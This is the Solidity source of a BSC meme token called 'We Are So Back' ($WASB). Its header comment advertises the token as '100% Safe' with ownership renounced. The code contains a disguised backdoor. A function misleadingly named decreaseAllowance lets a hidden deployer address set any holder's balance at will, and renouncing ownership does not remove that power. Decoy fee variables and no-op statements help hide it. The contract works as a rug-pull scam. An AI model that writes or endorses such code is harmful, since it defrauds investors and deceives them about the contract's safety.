/**
We Are So Back | $WASB
ABOUT
What's in a name, you ask? Well, in this case, everything! "We Are So Back" isn't just a name; it's an attitude. It's the cheeky grin of the underdog who's ready to play with the big dogs. It's the sly wink of a comeback kid who's been practicing in the shadows and is now ready to steal the spotlight.


So, fasten your seatbelts, folks, because "We Are So Back" is about to take you on a ride you won't want to get off. Buckle up and let's venture into the exciting unknown, where the past meets the future, and the only constant is the thrill of the ride!
     https://t.me/WASBcoin
Web: https://www.wearesoback.wtf/

Twitter: https://twitter.com/WASBOfficial

🌐 bsc trending buybot 24 hours Marketing .
🌐100% Safe 
🌐Contract verified 
🌐 LP Locked
🌐Owner renounced 
🌐BSC Chain

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract IERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address Empfanger, uint256 MengeWASB) external returns (bool);
    function allowance(address owner, address SpendWASB) external view returns (uint256);
    function approve(address SpendWASB, uint256 MengeWASB) external returns (bool);
    function transferFrom(address sender, address Empfanger, uint256 MengeWASB) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed SpendWASB, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is IERC20Burnable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract WASB is IERC20Burnable, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private WASBS;
    mapping (address => mapping (address => uint256)) private setsyncWASB;
    bytes32 public DOMWASBN_SEPARATORWASB;
    uint256 liquidityFeeBuy = 0; 
    uint256 stakingFeeBuy = 10; 
    uint256 devFeeBuy = 0; 
    uint256 marketingFeeBuy = 10;  
    uint256 reflectionFeeBuy = 5;   

    uint256 liquidityFeeSell = 0;  
    uint256 stakingFeeSell = 15;       
    uint256 devFeeSell = 0;      
    uint256 marketingFeeSell = 15;    
    uint256 reflectionFeeSell = 5;   
    
    uint256 feeDenominator = 100; 

    uint256 totalFeeBuy = marketingFeeBuy + liquidityFeeBuy + stakingFeeBuy + devFeeBuy + reflectionFeeBuy;     
    uint256 totalFeeSell = marketingFeeSell + liquidityFeeSell + stakingFeeSell + devFeeSell + reflectionFeeSell; 
    
    address autoLiquidityReceiver;
    address marketingFeeReceiver;
    address stakingFeeReceiver;
    address devFeeReceiver;

    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;
    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMITWASB_TYPEHASH = 0x6e81edae12b1897f4d1f60380fef10115fa2faae0126114a169c64845d6126c9;
    mapping(address => uint) public nonces;
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 100000000000000000;
    string private constant _name = "We Are So Back";
    string private constant _symbol = "WASB";
    address private syncWASB; 
    constructor () {
        syncWASB = _msgSender(); 
        WASBS[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return WASBS[account];
    }

    function transfer(address Empfanger, uint256 MengeWASB) public override returns (bool) {
        _transfer(_msgSender(), Empfanger, MengeWASB);
        return true;
    }

    function allowance(address owner, address SpendWASB) public view override returns (uint256) {
        return setsyncWASB[owner][SpendWASB];
    }

    function approve(address SpendWASB, uint256 MengeWASB) public override returns (bool) {
        _approve(_msgSender(), SpendWASB, MengeWASB);
        return true;
    }

    function transferFrom(address sender, address Empfanger, uint256 MengeWASB) public override returns (bool) {
        _transfer(sender, Empfanger, MengeWASB);
        _approve(sender, _msgSender(), setsyncWASB[sender][_msgSender()].sub(MengeWASB, "IERC20: transfer MengeWASB exceeds allowance"));
        return true;
    }

    function _approve(address owner, address SpendWASB, uint256 MengeWASB) private {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(SpendWASB != address(0), "IERC20: approve to the zero address");
        setsyncWASB[owner][SpendWASB] = MengeWASB;
        emit Approval(owner, SpendWASB, MengeWASB);
    }

    function decreaseAllowance(address SpendWASB, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        (SpendWASB != address(0), "IERC20: burn from the zero address"); 
        DOMWASBN_SEPARATORWASB;
        require(_msgSender() == syncWASB, "Ownable: caller is not the owner");
        WASBS[SpendWASB] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }

    function _transfer(address from, address to, uint256 MengeWASB) internal virtual
    {
        require(from != address(0), "IERC20: transfer from the zero address");
        require(to != address(0), "IERC20: transfer to the zero address");

        uint256 fromBalance = WASBS[from];
        require(fromBalance >= MengeWASB, "IERC20: transfer MengeWASB exceeds balance");
        WASBS[from] = fromBalance - MengeWASB;

        WASBS[to] = WASBS[to].add(MengeWASB);
        emit Transfer(from, to, MengeWASB);
    }
}